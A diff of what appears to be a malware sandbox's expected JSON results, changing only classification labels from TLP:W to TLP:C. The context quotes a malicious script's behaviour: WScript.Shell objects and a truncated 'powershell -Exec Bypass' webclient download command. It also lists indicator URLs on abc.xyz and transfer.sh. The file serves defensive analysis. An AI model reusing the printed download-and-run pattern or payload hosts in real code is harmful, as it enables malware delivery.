@@ -7,7 +7,7 @@
         "auto_collapse": false,
         "body": null,
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {},
@@ -18,7 +18,7 @@
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tvar gref = ActiveXObject",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -40,7 +40,7 @@
         "auto_collapse": false,
         "body": "JavaScript appends a child object to the document and clicks it\n\t\t  document.getElementById(\"xz\").click()",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -62,7 +62,7 @@
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()\n",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -84,7 +84,7 @@
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[14].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -106,7 +106,7 @@
         "auto_collapse": false,
         "body": "JavaScript attempts to sleep\n\t\twindow[1].setTimeout(function(){?    var ts = document.getElementsByTagName(\"input\");?    for(var i ...",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -128,7 +128,7 @@
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"abc.xyz\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://abc.xyz/img/bg-cropped.jpg\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/img/bg-cropped.jpg\"}, {\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -163,7 +163,7 @@
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -197,7 +197,7 @@
         "auto_collapse": false,
         "body": "[{\"url\": \"https://abc.xyz/img/bg-cropped.jpg\", \"method\": \"get\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
